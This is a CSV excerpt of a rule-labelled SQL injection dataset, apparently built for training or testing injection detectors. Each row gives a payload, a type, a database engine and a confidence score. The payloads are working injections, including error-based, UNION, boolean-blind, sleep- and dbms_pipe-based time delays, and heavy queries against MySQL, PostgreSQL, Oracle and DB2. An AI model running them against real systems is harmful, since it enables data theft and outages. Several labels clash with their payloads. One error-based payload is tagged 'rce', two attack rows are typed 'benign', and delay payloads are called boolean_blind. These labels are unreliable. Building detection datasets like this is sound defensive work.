row_index,payload_norm,label,sqli_type_hint,sqli_type,db_engine,confidence,reasoning,label_source
7756,"1 or ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9173 = 9173,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) -- ivku",1,,rce,mysql,0.95,0x7171706a71 detected — rce injection (priority 1) on mysql,rule-based
7757,"1' ) where 6274 = 6274 or 8156 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",1,,heavy_query,generic,0.95,"generate_series (, select count ( * ) from generate_series ( 1,5000000 detected — heavy_query injection (priority 6) on generic",rule-based
7758,"1'+ ( select 'asdq' where 4023 = 4023 and make_set ( 8403 = 8403,8899 ) ) +'",1,,boolean_blind,generic,0.95,4023 = 4023 and detected — boolean_blind injection (priority 8) on generic,rule-based
7759,1' ) ) as fcjk where 7755 = 7755,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
7760,-4896' ) union all select 1929--,1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
7761,"1"" ) ) and 4595 = 4595#",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
7762,"-9582' ) where 4397 = 4397 union all select 4397,4397,4397#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
7763,"-9110"" ) ) union all select 2263,2263,2263,2263,2263#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
7764,"-8118"" ) where 3561 = 3561 or ( 8459 = 8459 ) *4906--",1,,boolean_blind,generic,0.95,3561 = 3561 or detected — boolean_blind injection (priority 8) on generic,rule-based
7765,"1"" ) and elt ( 1210 = 1210,sleep ( 5 ) ) and ( ""zxks"" = ""zxks",1,,time_blind,mysql,0.95,sleep ( is MySQL-specific time-delay function — time-based blind inference (priority 5),rule-based
7766,"1"" ) ) ) ( select ( case when ( 4587 = 4587 ) then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 ) end ) from ( values ( 0 ) ) ) and ( ( ( ""kfdh"" like ""kfdh",1,,boolean_blind,generic,0.95,") and (, like "" detected — boolean_blind injection (priority 8) on generic",rule-based
7767,"1"" ) ) or 8156 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",1,,heavy_query,generic,0.95,"generate_series (, select count ( * ) from generate_series ( 1,5000000 detected — heavy_query injection (priority 6) on generic",rule-based
7768,"1"" ) ) ) or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) and ( ( ( ""rtzn"" = ""rtzn",1,,boolean_blind,generic,0.95,) and ( detected — boolean_blind injection (priority 8) on generic,rule-based
7769,"select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and ( ( 'ootz' like 'ootz",1,,heavy_query,db2,0.95,"select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm detected — heavy_query injection (priority 6) on db2",rule-based
